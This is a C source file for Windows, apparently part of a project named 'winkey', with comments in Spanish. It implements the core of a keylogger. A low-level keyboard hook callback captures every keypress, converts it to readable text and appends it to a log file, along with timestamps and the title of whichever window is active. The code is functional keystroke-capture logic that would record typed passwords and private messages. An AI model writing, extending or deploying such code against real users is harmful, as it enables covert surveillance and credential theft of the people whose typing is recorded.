#include "winkey.h"

t_WinkeyState g_winkeyState = {0};

// Detecta si la ventana activa ha cambiado
static BOOL HasWindowChanged(void)
{
    HWND currentWindow;

    currentWindow = GetForegroundWindow();
    if (currentWindow != g_winkeyState.lastWindow) {
        g_winkeyState.lastWindow = currentWindow;
        return TRUE;
    }
    return FALSE;
}

// Registra la información de la ventana activa actual
static void LogCurrentWindow(void)
{
    WCHAR wTitle[256];
    char windowTitle[512];
    time_t currentTime;
    struct tm timeInfo;

    if (!g_winkeyState.logFile)
        return;

    // Obtiene el título de la ventana en wide chars y convierte a UTF-8
    if (!GetWindowTextW(g_winkeyState.lastWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)))) {
        strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
    } else {
        int bytes = WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, windowTitle, (int)sizeof(windowTitle), NULL, NULL);
        if (bytes <= 0)
            strcpy_s(windowTitle, sizeof(windowTitle), "Unknown Window");
    }

    // Obtiene timestamp y escribe al log
    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);

    fprintf(g_winkeyState.logFile, "\n[%02d.%02d.%04d %02d:%02d:%02d] - '%s'\n",
            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec, windowTitle);
    
    fflush(g_winkeyState.logFile);
}

// Registra una tecla pulsada en el archivo de log
static void LogKeyStroke(DWORD vkCode)
{
    const char *keyString;

    if (!g_winkeyState.logFile)
        return;

    // Verifica si cambió la ventana activa
    if (HasWindowChanged()) {
        LogCurrentWindow();
    }

    // Convierte el código de tecla a texto legible usando ToUnicodeEx
    keyString = VkCodeToString(vkCode);
    if (keyString && strlen(keyString) > 0) {
        fprintf(g_winkeyState.logFile, "%s", keyString);
        fflush(g_winkeyState.logFile);
    }
}

// Callback del hook de teclado de bajo nivel
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT keyInfo;

    // Solo procesar si el código es válido y es una pulsación de tecla
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        keyInfo = (PKBDLLHOOKSTRUCT)lParam;
        // Registra la tecla pulsada
        LogKeyStroke(keyInfo->vkCode);
    }

    // Pasar al siguiente hook en la cadena
    return CallNextHookEx(g_winkeyState.keyboardHook, nCode, wParam, lParam);
}